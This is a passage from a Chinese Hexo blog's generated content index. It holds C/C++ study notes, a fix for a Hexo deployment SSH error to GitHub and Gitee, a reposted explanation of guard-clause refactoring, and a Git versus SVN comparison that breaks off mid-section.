a)-&gt;遇’\0’结束；gets()遇回车结束，前无截点。</li><li>x *= y+8 等价于 x = x + (y+8)</li><li>C语言的函数体中，可以调用但不能定义其他函数。</li><li>puts()自动换行，putchar()不自动换行。</li></ol><h1 id="补充2-c笔记"><a class="markdownIt-Anchor" href="#补充2-c笔记"></a> <strong>补充2 C++笔记</strong></h1><ol><li><p>endl = ‘\n’ + flush(刷新缓冲区)</p></li><li><p>cin跳过空白字符，cin.get()读取包含空白字符的字符</p></li><li><p>浮点数和整型注意转化中的除号</p></li><li><p>递归调用次数可用二叉树解决</p></li><li><p>C++, 字符串拷贝用&quot;=&quot;, 字符串比较&quot;==&quot;</p></li><li><p>汉字占两个字符，故name[0]无法输出，&quot;cout&lt;&lt;name[0]&lt;&lt;name[1]&quot;输出一个汉字</p></li><li><p>cin对象遇’\n’结束</p></li><li><p>nullptr能够避免在整数(0或NULL)和指针(nullptr)之间发生混淆</p></li><li><p><strong>函数传参</strong>：数据较小，按值传递，但修改时用引用；数组用指针；结构体用指针或引用；对象用引用</p></li><li><p><strong>缺省函数</strong>：声明函数(最先且一次)时为其参数指定默认值</p></li><li><p><strong>sizeof()</strong>: 测字节(包含’\0’)区分数组与指针<strong>strlen()</strong>: 不区分数组还是指针，读到’\0’为止返回长度(\t,\n不停)</p></li><li><p><strong>全局变量</strong>: int global -&gt; extern int global 声明到文件结尾<strong>局部变量</strong>: 从声明到函数结束<strong>静态变量</strong>: 函数退出保留值，下次调用</p></li><li><p>getline()读取换行符，但向数组存储时并不存储</p></li><li><p>初始化和赋值是不同概念</p></li><li><p>文本文件存储文件大小：char类型存储；二进制文件：&quot;01&quot;存储(内存大小)</p></li><li><p>引起缓存区刷新：缓存区满时(4K)；程序结束；flush语句；close语句；endl语句</p></li><li><p>解决<redefinition>：<em>#ifdef ``` #endif</em> 或 <em>#pragma once</em></redefinition></p></li><li><p>派生类的构造函数只能描述自己的成员和基类的初始化，不能去初始化基类的成员；基类的成员需要调用基类的构造函数初始化。</p></li><li><p>k = (a=1, b=2, a+b)逗号运算符</p></li><li><p>自身类的对象不能作为类的成员(存在无限初始化问题，构造成员变量-&gt;调用自身的构造函数)，而自身类对象的引用和指针可以。</p></li><li><p><strong>虚函数</strong>：特殊的成员函数，用来实现运行时的多态；动态决议(运行时才绑定)；基类说明virtual后，子类可缺省virtual<strong>静态成员函数</strong>：静态决议(编译时就绑定)，属于整个class，并不针对某个类的实例，为所有对象所共用，作用域为全局；不能直接使用this指针；virtual不能是static</p></li><li><p><strong>静态数据成员</strong>：class内声明：<em>static int num</em>; class外定义：<em>int className::num</em>(无static，默认0)</p></li><li><p><strong>继承中的析构函数</strong>：基类的指针可指向派生类对象(多态性); *if delete []p;*就会调用该指针指向的派生类析构函数，而其自动调用基类的析构函数，整个派生类的对象被完全释放。若析构函数不被声明成虚函数，则编译器是是静态绑定，再删除基类指针时，只会调用基类的析构函数而不调用派生类的析构函数，这样一来派生类对象析构不完全。</p></li><li><p>两个指针指向同一数组，可以相减，结果是两个指针之间的元素数目。</p></li><li><p><strong>函数模板</strong>：一个模板，专门用来生产函数的<strong>模板函数</strong>：是函数模板的实例化 <strong>注</strong>：类模板和模板类亦同</p></li><li><p>联编</p><p>：程序自身彼此关联的过程，确定程序中的操作调用与执行该操作的代码之间的关系。</p><ul><li><strong>静态联编</strong>：联编工作出现在联编阶段，用对象名或者类名来限定要调用的函数；</li><li><strong>动态联编</strong>：联编工作在程序运行时执行，在程序运行时才确定将要调用的函数。</li></ul></li><li><p>虚基类子对象是由最远派生类的构造函数通过调用虚基类的构造函数进行初始化的；初始化列表列出对虚基类调用，如未列出则用虚基类构造函数；先虚后非虚。</p></li><li><p><strong>虚基类</strong>：多条继承路径上有一个公共的基类，公共的基类会产生多个实例。<em>virtual class</em>是为了实例化一次基类存在的。eg: ios类是istream和ostream类的虚基类。</p></li><li><p>char = int + ‘0’</p></li><li><p><strong>指针数组</strong>：int *p[4]<strong>数组指针</strong>：int (*p)[4]</p></li><li><p><strong>Runtime Error</strong>: 除0操作；数组越界；栈溢出；未指定值的指针进行读写操作；已经释放空间的指针再次释放。</p></li><li><p>数组</p><p>：</p><ul><li><strong>int&amp;float&amp;double</strong>:初始化补零</li><li><strong>char</strong>: 初始化补’\0’</li><li><strong>对象</strong>：调用缺省构造函数</li></ul></li><li><p>常对象不能被更新，因此通过常对象只能调用他的常成员函数。</p></li><li><p>临时对象是在遇到其后第一个分号(语句结束处)析构的。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo d报错</title>
      <link href="/2022/04/19/hexo-d%E6%8A%A5%E9%94%99/"/>
      <url>/2022/04/19/hexo-d%E6%8A%A5%E9%94%99/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-报错"><a class="markdownIt-Anchor" href="#1-报错"></a> 1 报错</h1><p>hexo d 命令报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/c/Users/Dragon Liu/.ssh/config: line 5: Bad configuration option: password</span><br><span class="line">/c/Users/Dragon Liu/.ssh/config: terminating, 1 bad configuration options</span><br><span class="line">fatal: Could not <span class="built_in">read</span> from remote repository.</span><br><span class="line"></span><br><span class="line">Please make sure you have the correct access rights</span><br><span class="line">and the repository exists.</span><br><span class="line">[41mFATAL[49m Something<span class="string">'s wrong. Maybe you can find the solution here: [4mhttps://hexo.io/docs/troubleshooting.html[24m</span></span><br><span class="line"><span class="string">[33mError: Spawn failed</span></span><br><span class="line"><span class="string">    at ChildProcess.&lt;anonymous&gt; (E:\01 Blog_work\Hexo-Blog\node_modules\hexo-deployer-git\node_modules\hexo-util\lib\spawn.js:51:21)</span></span><br><span class="line"><span class="string">    at ChildProcess.emit (events.js:200:13)</span></span><br><span class="line"><span class="string">    at ChildProcess.cp.emit (E:\01 Blog_work\Hexo-Blog\node_modules\hexo-deployer-git\node_modules\cross-spawn\lib\enoent.js:34:29)</span></span><br><span class="line"><span class="string">    at Process.ChildProcess._handle.onexit (internal/child_process.js:272:12)[39m</span></span><br></pre></td></tr></table></figure><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><h2 id="21-情况1"><a class="markdownIt-Anchor" href="#21-情况1"></a> 2.1 情况1</h2><p><code>ssh -T git@github.com</code> 测试无法连接：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\01 Blog_work\Hexo-Blog&gt;ssh -T git@github.com</span><br><span class="line">C:\\Users\\Dragon Liu/.ssh/config: line 5: Bad configuration option: password</span><br><span class="line">C:\\Users\\Dragon Liu/.ssh/config: terminating, 1 bad configuration options</span><br></pre></td></tr></table></figure><p>原因是之前vscode下载插件Remote - SSH时配置了此文件：</p><img src="https://s2.loli.net/2022/04/19/EF7GobKALXv1jr3.png" width="800" height="300" alt="图片名称" align="center" id="186"><p>删除<code>config</code>文件即可测试成功：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\01 Blog_work\Hexo-Blog&gt;ssh -T git@github.com</span><br><span class="line">Warning: Permanently added the ECDSA host key <span class="keyword">for</span> IP address <span class="string">'140.82.112.3'</span> to the list of known hosts.</span><br><span class="line">Hi Dragonliu2018! You<span class="string">'ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></figure><p>然后<code>hexo d</code>也可以成功。</p><h2 id="22-情况2"><a class="markdownIt-Anchor" href="#22-情况2"></a> 2.2 情况2</h2><p>hexo原本部署到GitHub，现在需要另一个hexo-blog来写Algorithm部分，然后部署到gitee，hexo d后出现报错。</p><p><code>ssh -T git@gitee.com</code> 测试无法连接：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\01 Blog_work\Hexo-Blog-Algorithm&gt;ssh -T git@gitee.com</span><br><span class="line">Warning: Permanently added the ED25519 host key <span class="keyword">for</span> IP address <span class="string">'180.97.125.228'</span> to the list of known hosts.</span><br><span class="line">git@gitee.com: Permission denied (publickey).</span><br></pre></td></tr></table></figure><p>原因是没有在 Gitee 中添加 SSH 公钥，复制<code>id_rsa_pub</code> 文件内容，然后打开 gitee 个人设置里面的 安全设置 - SSH公钥，标题可以随便取，把粘贴的内容复制到公钥里面，点击确定就可以：</p><img src="https://s2.loli.net/2022/04/19/yJIVgfYDMd2A7ne.png" width="900" height="250" alt="图片名称" align="center" id="187"><img src="https://s2.loli.net/2022/04/19/75BPQXYca9IuO2C.png" width="900" height="500" alt="图片名称" align="center" id="188"><p>此时测试成功：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\01 Blog_work\Hexo-Blog-Algorithm&gt;ssh -T git@gitee.com</span><br><span class="line">Hi [36;01mDragon-Liu[0m! You<span class="string">'ve [32msuccessfully[0m authenticated, but GITEE.COM does not provide shell access.</span></span><br></pre></td></tr></table></figure><p>然后<code>hexo d</code>即可成功。</p><blockquote><p><strong>吐槽</strong>：</p><ol><li>很容易部署失败：提示可能包含违禁违规内容。</li><li>后期如果新增了文章，执行 <code>hexo g -d</code>后 ，还需要更新 Gitee Pages 服务</li></ol></blockquote><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://blog.csdn.net/qq_38157825/article/details/112783631" target="_blank" rel="noopener">Hexo 部署到 Gitee</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>卫语句</title>
      <link href="/2022/04/18/%E5%8D%AB%E8%AF%AD%E5%8F%A5/"/>
      <url>/2022/04/18/%E5%8D%AB%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p><strong>转载</strong>：<a href="https://blog.csdn.net/qq_36631379/article/details/107951535" target="_blank" rel="noopener">浅谈使用卫语句重构方法</a></p></blockquote><h1 id="1-卫语句定义"><a class="markdownIt-Anchor" href="#1-卫语句定义"></a> 1 卫语句定义</h1><p>如果条件语句极其复杂，就应该将条件语句拆解开，然后逐个检查，并在条件为真时立刻从函数中返回，这样的单独检查通常被称之为“卫语句”(Guard Clauses)。</p><p><strong>说人话就是</strong>：写方法时在合适的时候尽快return，少用else</p><h1 id="2-按卫语句对函数进行重构应遵循"><a class="markdownIt-Anchor" href="#2-按卫语句对函数进行重构应遵循"></a> 2 按卫语句对函数进行重构应遵循</h1><ol><li>及时return，if中能return就return。(一旦满足条件return后你根本无需关注后面的代码)</li><li>能够return的就尽量少使用else。(用else太多，读者需要维护大量的栈在大脑中)</li><li>减少嵌套，一般嵌套超过4层读者就会产生阅读恐惧感。</li></ol><h1 id="3-示例"><a class="markdownIt-Anchor" href="#3-示例"></a> 3 示例</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>（it == 活的）&#123;</span><br><span class="line">    <span class="keyword">if</span>（it == 人）&#123;</span><br><span class="line">        <span class="keyword">if</span>（it ！= 女人）&#123;</span><br><span class="line">            <span class="keyword">return</span> 不喜欢；</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> 喜欢；</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> 不喜欢；</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> 不喜欢；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上代码无非就是表达 <code>我只喜欢活的女人</code> 的意思，但是代码一层套一层明显妨碍了我在第一时间获取最核心信息的效率，使用卫语句来表达就是：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> （it ！= 活的）&#123;<span class="keyword">return</span> 不喜欢&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>（it！=人）&#123;<span class="keyword">return</span> 不喜欢&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>（it！=女人）&#123;<span class="keyword">return</span> 不喜欢&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>（it == 女人 &amp;&amp; it == 活的） &#123;<span class="keyword">return</span> 喜欢&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> 不喜欢</span><br></pre></td></tr></table></figure><p>这样看起来，代码就更明晰易懂。</p><p>有点<strong>逆向思维</strong>的意思。</p>]]></content>
      
      
      <categories>
          
          <category> 未分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 重构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git vs svn</title>
      <link href="/2022/04/18/git-vs-svn/"/>
      <url>/2022/04/18/git-vs-svn/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p><strong>转载</strong>：<a href="https://www.cnblogs.com/Sungeek/p/9152223.html#sg3" target="_blank" rel="noopener">SVN与Git比较的优缺点差异</a></p></blockquote><h1 id="1-集中式-vs-分布式"><a class="markdownIt-Anchor" href="#1-集中式-vs-分布式"></a> 1 集中式 vs 分布式</h1><h2 id="11-subversion属于集中式的版本控制系统"><a class="markdownIt-Anchor" href="#11-subversion属于集中式的版本控制系统"></a> 1.1 <strong>Subversion属于集中式的版本控制系统</strong></h2><p>集中式的版本控制系统都有一个单一的集中管理的服务器，保存所有文件的修订版本，而协同工作的人们都通过客户端连到这台服务器，取出最新的文件或者提交更新。</p><img src="https://s2.loli.net/2022/04/18/bqmSZKA6HNOGxyu.png" width="300" height="300" alt="图片名称" align="center" id="172"><p><strong>Subversion的特点概括起来主要由以下几条：</strong></p><ul><li>每个版本库有唯一的URL（官方地址），每个用户都从这个地址获取代码和数据；</li><li>获取代码的更新，也只能连接到这个唯一的版本库，同步以取得最新数据；</li><li>提交必须有网络连接（非本地版本库）；</li><li>提交需要授权，如果没有写权限，提交会失败；</li><li>提交并非每次都能够成功。如果有其他人先于你提交，会提示“改动基于过时的版本，先更新再提交”… 诸如此类；</li><li>冲突解决是一个提交速度的竞赛：手快者，先提交，平安无事；手慢者，后提交，可能遇到麻烦的冲突解决。</li></ul><p><strong>好处</strong>：每个人都可以一定程度上看到项目中的其他人正在做些什么。而管理员也可以轻松掌控每个开发者的权限。</p><p><strong>缺点</strong>：</p><ul><li>中央服务器的单点故障。若是宕机一小时，那么在这一小时内，谁都无法提交更新、还原、对比等，也就无法协同工作。如果中央服务器的磁盘发生故障，并且没做过备份或者备份得不够及时的话，还会有丢失数据的风险。最坏的情况是彻底丢失整个项目的所有历史更改记录，被客户端提取出来的某些快照数据除外，但这样的话依然是个问题，你不能保证所有的数据都已经有人提取出来。</li><li>Subversion原理上只关心文件内容的具体差异。每次记录有哪些文件作了更新，以及都更新了哪些行的什么内容。</li></ul><h2 id="12-git属于分布式的版本控制系统"><a class="markdownIt-Anchor" href="#12-git属于分布式的版本控制系统"></a> 1.2 Git属于分布式的版本控制系统</h2><img src="https://s2.loli.net/2022/04/18/uryM1ZCEP6b2NRF.png" width="300" height="300" alt="图片名称" align="center" id="171"><p>Git记录版本历史只关心文件数据的<strong>整体</strong>是否发生变化。Git 不保存文件内容前后变化的差异数据。</p><p>实际上，Git 更像是把变化的文件作快照后，记录在一个微型的文件系统中。每次提交更新时，它会纵览一遍所有文件的指纹信息并对文件作一快照，然后保存一个指向这次快照的索引。为提高性能，若文件没有变化，Git 不会再次保存，而只对上次保存的快照作一连接。</p><p>在分布式版本控制系统中，客户端并不只提取最新版本的文件快照，而是把原始的代码仓库完整地镜像下来。这么一来，任何一处协同工作用的服务器发生故障，事后都可以用任何一个镜像出来的本地仓库恢复。这类系统都可以指定和若干不同的远端代码仓库进行交互。籍此，你就可以在同一个项目中，分别和不同工作小组的人相互协作。你可以根据需要设定不同的协作流程。</p><p>另外，因为Git在本地磁盘上就保存着所有有关当前项目的历史更新，并且Git中的绝大多数操作都只需要访问本地文件和资源，不用连网，所以处理起来速度飞快。用SVN的话，没有网络或者断开VPN你就无法做任何事情。但用Git的话，就算你在飞机或者火车上，都可以非常愉快地频繁提交更新，等到了有网络的时候再上传到远程的镜像仓库。换作其他版本控制系统，这么做几乎不可能，抑或是非常麻烦。</p><p><strong>Git具有以下特点：</strong></p><ul><li>Git中每个克隆(clone)的版本库都是平等的。你可以从任何一个版本库的克隆来创建属于你自己的版本库，同时你的版本库也可以作为源提供给他人，只要你愿意。</li><li>Git的每一次提取操作，实际上都是一次对代码仓库的完整备份。</li><li>提交完全在本地完成，无须别人给你授权，你的版本库你作主，并且提交总是会成功。</li><li>甚至基于旧版本的改动也可以成功提交，提交会基于旧的版本创建一个新的分支。</li><li>Git的提交不会被打断，直到你的工作完全满意了，PUSH给他人或者他人PULL你的版本库，合并会发生在PULL和PUSH过程中，不能自动解决的冲突会提示您手工完成。</li><li>冲突解决不再像是SVN一样的提交竞赛，而是在需要的时候才进行合并和冲突解决。</li><li>Git 也可以模拟集中式的工作模式</li><li>Git版本库统一放在服务器中</li><li>可以为 Git 版本库进行授权：谁能创建版本库，谁能向版本库PUSH，谁能够读取（克隆）版本库</li><li>团队的成员先将服务器的版本库克隆到本地；并经常的从服务器的版本库拉（PULL）最新的更新；</li><li>团队的成员将自己的改动推（PUSH）到服务器的版本库中，当其他人和版本库同步（PULL）时，会自动获取改变</li><li>Git 的集中式工作模式非常灵活</li><li>你完全可以在脱离Git服务器所在网络的情况下，如移动办公／出差时，照常使用代码库</li><li>你只需要在能够接入Git服务器所在网络时，PULL和PUSH即可完成和服务器同步以及提交</li><li>Git提供 rebase 命令，可以让你的改动看起来是基于最新的代码实现的改动</li><li>Git 有更多的工作模式可以选择，远非 Subversion可比</li></ul><h1 id="2-版本库与工作区"><a class="markdownIt-Anchor" href="#2-版本库与工作区"></a> 2 版本库与工作区</h1><p>Subversion的工作区和版本库是截然分开的，而Git的工作区和版本库是如影随形的。</p><h2 id="21-svn的版本库和工作区是分离的"><a class="markdownIt-Anchor" href="#21-svn的版本库和工作区是分离的"></a> 2.1 SVN的版本库和工作区是分离的</h2><ul><li>Subversion 的工作区和版本库物理上分开：Subversion的版本库和工作区是存储在不同路径下，一般是在不同的主机中</li><li>Subversion的企业级部署中，版本库在服务器上，只能通过 https, http, svn 等协议访问，而不能直接被用户接触到。</li><li>Subversion的工作区是一份版本库在某个历史状态下的快照，如：版本库最新的数据检出到工作区。</li><li>Subversion的工作区中每一个目录下都包含一个名为 .svn 的控制目录（隐藏的目录），该目录的作用是：<ul><li>标识工作区和版本库的对应关系。</li><li>包含一份该子目录下检出文件的原始拷贝。当文件改动的差异比较或者本地改动的回退时，可以直接参考原始拷贝而无须通过网络访问远程版本库。</li></ul></li><li>Subversion 的 .svn 控制目录会引入很多麻烦：<ul><li>.svn 下的文件原始考本，会导致在目录下按照文件内容搜索时，多出一倍的搜索时间和搜索结果。</li><li>.svn 很容易在集成时，引入产品中，尤其是 Web 应用，将 .svn 目录带入Web服务器会导致安全隐患。因为一个不允许目录浏览的Web目录，可以通过 .svn/entries 文件查看到该目录下可能存在的文件。</li></ul></li></ul><h2 id="22-git-的版本库和工作区如影随形"><a class="markdownIt-Anchor" href="#22-git-的版本库和工作区如影随形"></a> 2.2 Git 的版本库和工作区如影随形</h2><ul><li>Git 的版本库和工作区在同一个目录下，工作区的根目录有一个.git的子目录，这个名为 .git的目录就是版本库本身，它是Git 用来保存元数据和对象数据库的地方。该目录非常重要，每次克隆镜像仓库的时候，实际拷贝的就是这个目录里面的数据。所以千万要小心删除这个文件。</li><li>工作区中其他文件为工作区文件，可能是从 .git 中检出的，或者是要检入的，或者是运行产生的临时文件等。</li><li>版本库可以脱离工作区而存在，成为 bare（赤裸）版本库。可以用 –bare 参数来创建。但是工作区不能脱离版本库而存在，即工作区的根目录下必须有一个名为 .git 的版本库克隆文件。</li><li>Git 的版本库因为就在工作区中，能直接被用户接触到。<ul><li>用户可以编辑 .git/config 文件，修改配置，增添新的源</li><li>用户可以编辑 .git/info/exclude 文件，创建本地忽略…</li></ul></li><li>Git 的工作区中只在工作区的根目录下有一个 .git 目录，此外再无任何控制目录。Git 工作区下唯一的 .git 目录是版本库，并非 .svn 的等价物，如果删除了 .git 目录，而又没有该版本库的其他镜像（克隆）的话，你破坏了整个历史，版本库也永远的失去了。</li><li>Git 在本地的 .git 版本库，提供了完全的改动历史。除了和其他人数据交换外，任何版本库相关的操作都在本地完成，更多的本地操作，避免了冗长的网络延迟，大大节省了时间。例如：查看 log，切换到任何历史版本等操作都无须连接网络。</li><li>Git如何保证安全：本地创建一个Git库，因为工作区和库是在同一个目录中，如果工作区删除了，或者所在的磁盘分区格式化了，数据不是全都没有了么？其实我们可以这样做：<ul><li>在一个磁盘分区中创建版本库（最好是用 –bare 参数创建），然后在另外的磁盘分区中克隆一个新的作为工作区。在工作区的提交要不时的PUSH到另外分区的版本库，这样就实现了本地的数据镜像。你甚至可以在本地创建更多的版本库镜像，安全性要比Subversion的一个库加上一个工作区安全。</li><li>另一个办法：把你的版本库共享给他人，当他人克隆了你的版本库时，你就拥有了一个异地备份。</li></ul></li></ul><h1 id="3-全局版本号和全球版本号"><a class="markdownIt-Anchor" href="#3-全局版本号和全球版本号"></a> 3 全局版本号和全球版本号</h1><p>SVN的全局版本号和CVS的每个文件都独立维护一套版本号相比，是一个非常大的进步。在看似简单的全局版本号的背后，是Subversion提供对于事物处理的支持，每一个事物处理（即一次提交）都具有整个版本库全局唯一的版本号。</p><p>Git的版本号则更进一步，版本号是全球唯一的。Git 对于每一次提交，通过对文件的内容或目录的结构计算出一个SHA-1 哈希值，得到一个40位的十六进制字符串，Git将此字符串作为版本号。</p><h2 id="31-svn与git版本号比较"><a class="markdownIt-Anchor" href="#31-svn与git版本号比较"></a> 3.1 SVN与Git版本号比较</h2><ul><li>所有保存在Git 数据库中的数据都是用此40位的哈希值作索引的，而不是靠文件名。</li><li>使用哈希值作版本号的好处就是对于一个分布式的版本控制系统，每个人每次提交后形成的版本号都不会出现重复。另一好处是保证数据的完整性，因为哈希值是根据内容或目录结构计算出来的，所以我们还可以据此来判断数据内容是否被篡改。</li><li>SVN 的版本号是连续的，可以预判下一个版本号，而 Git 的版本号则不是。<ul><li>因为 subversion 是集中式版本控制，很容易实现版本号的连续性。</li><li>Git 是分布式的版本控制系统，而且 Git 采用 40 位长的哈希值作为版本号，每个人的提交都是各自独立完成的，没有先后之分（即使提交有先后之分，也由于PUSH/PULL的方向和时机而不同）。Git 的版本号虽然不连续，但是是有线索的，即每一个版本都有对应的父版本（一个或者两个），进而可以形成一个复杂的提交链</li></ul></li><li>Git 的版本号简化：Git 可以使用从左面开始任意长度的字串作为简化版本号，只要该简化的版本号不产生歧义。一般采用7位的短版本号（只要不会出现重复的，你也可以使用更短的版本号）。</li></ul><h1 id="4-部分检出"><a class="markdownIt-Anchor" href="#4-部分检出"></a> 4 部分检出</h1><p>Subversion可以将整个库检出到工作区，也可以将某个目录检出到工作区。对于要使用一个庞大、臃肿的版本库的用户来说，部分检出是非常方便和实际的。</p><p>但是Git只能全部检出，不支持按照目录进行的部分检出。</p><h2 id="41-svn的部分检出"><a class="markdownIt-Anchor" href="#41-svn的部分检出"></a> 4.1 SVN的部分检出</h2><ul><li>在SVN中，从仓库checkout的一个工作树，每个子目录下都维护着自己的.svn目录，记录着该目录中文件的修改情况以及和服务器端仓库的对应关系。所以SVN可以checkout部分路径下的内容（部分检出），而不用checkout整个版本库或分支。</li><li>Subversion 有一条命令：svn export ，可以将 subversion 版本库的一个目录下所有内容导出到指定的目录下。Subversion 需要 svn export 命令是因为该命令可以导出一个干净的目录，即不包含 .svn 目录（包含配置文件和文件原始拷贝）。</li></ul><h2 id="42-git的检出"><a class="markdownIt-Anchor" href="#42-git的检出"></a> 4.2 Git的检出</h2><ul><li>Git 没有部分检出，这并不是说只有将整个库克隆下来才能查看文件。有很多 git 工具，提供直接浏览git库的功能，例如 gitweb, trac 的 git 版本库浏览, redmine 的 git 版本库浏览。</li><li>Git-submodule 可以实现版本库的模块化：Git 通过子模块处理这个问题。子模块允许你将一个Git 仓库当作另外一个Git仓库的子目录。这允许你克隆另外一个仓库到你的项目中并且保持你的提交相对独立。</li><li>Git 为什么没有实现 svn export 的功能？由于git的本地仓库信息完全维护在project根目录的.git目录下，（不像svn一样，每个子目录下都有单独的.svn目录）。所以，只要clone，checkout然后删除.git目录就可以了。</li></ul><h1 id="5-更新和提交"><a class="markdownIt-Anchor" href="#5-更新和提交"></a> 5 更新和提交</h1><h2 id="51-更新操作"><a class="markdownIt-Anchor" href="#51-更新操作"></a> 5.1 更新操作</h2><p>在SVN中，因为只有一个中心仓库，所以所谓的远程更新，也就是svn update ,通过此命令来使工作区和版本库保持同步。</p><p>对于git来说，别人的改动是存在于远程仓库上的，所以git checkout命令尽管在某些功能上和svn中的update类似（例如取仓库特定版本的内容），但是在远程更新这一点上，还是不同的，不属于git checkout的功能涵盖范围。 Git使用git fetch和git pull来完成远程更新任务，fetch操作只是将远程数据库的object拷贝到本地，然后更新remotes head的refs，git pull 的操作则是在git fetch的基础上对当前分支外加merge操作。</p><blockquote><p>大致上 git pull = git fetch + git merge</p></blockquote><h2 id="52-svn中的commit命令"><a class="markdownIt-Anchor" href="#52-svn中的commit命令"></a> 5.2 SVN中的commit命令</h2><p>对于SVN来说，由于是中心式的仓库管理形式，所以并不存在特殊的远程提交的概念，所有的commit操作都可以认为是对远程仓库的更新动作。在工作区中对文件进行添加、修改、删除操作要同步到版本库，必须使用 commit命令。</p><ul><li>add 命令，是将未标记为版本控制状态的文件标记为添加状态，并在下次提交时入库。</li><li>delete命令，是通过SVN来删除文件，并在下次提交后有效。</li><li>Subversion 有提交列表功能，即将某些文件加入一个修改列表，提交可以只提交处于该列表的文件。</li></ul><h2 id="53-git中的暂存区域stage"><a class="markdownIt-Anchor" href="#53-git中的暂存区域stage"></a> 5.3 Git中的暂存区域（stage）</h2><p>Git 管理项目时，文件在三个工作区域中流转：Git 的本地数据目录，工作目录以及暂存区域。暂存区域（stage）是介于 workcopy 和 版本库 HEAD 版本的一种中间状态。所谓的暂存区域只不过是个简单的文件，一般都放在git 目录中。有时候人们会把这个文件叫做索引文件，不过标准说法还是叫暂存区域。</p><p>要将一个文件纳入版本管理的范畴，首先是要用git add将文件纳入stage的监控范围，只有更新到stage中的内容才会在commit的时候被提交。另外，文件本身的改动并不会自动更新到stage中，每次的任何修改都必须重新更新到stage中去才会被提交。对于工作区直接删除的文件，需要用 git rm 命令进行标记，在下次提交时，在版本库中删除。</p><ul><li>工作区的文件改动（新增文件，修改文件，删除文件），必须用 git add 或者 git rm 命令标识，使得改动进入 stage</li><li>提交只对加入 stage 的改动进行提交</li><li>如果一个文件改动加入 stage 后再次改动，则后续改动不改变 stage。即该文件的改动有两个状态，一个是标记到 stage 中并将在下次提交时入库的改动，另外的后续改动则不被提交，除非再次使用 git add 命令将改动加入到 stage 中。</li><li>Git的stag让你在提交的时候清楚的知道git将要提交哪些改动。除非提交的时候使用 -a 参数（不建议使用）。</li></ul><p>我们可以从文件所处的位置来判断其状态：如果是git目录中保存着的特定版本文件，就属于已提交状态；如果作了修改并已放入暂存区域，就属于已暂存状态；如果自上次取出后，作了修改但还没有放到暂存区域，就是已修改状态，如果取出后未进行修改则是未修改状态。</p><p>在git中，因为有本地仓库和remote仓库之分，所以也就区别于commit 操作，存在额外的push命令，用于将本地仓库的数据更新到远程仓库中去。git push 可以选择需要提交的、更新的分支以及制定该分支在远程仓库上的名字。</p><h1 id="6-分支和里程碑的实现"><a class="markdownIt-Anchor" href="#6-分支和里程碑的实现"></a> 6 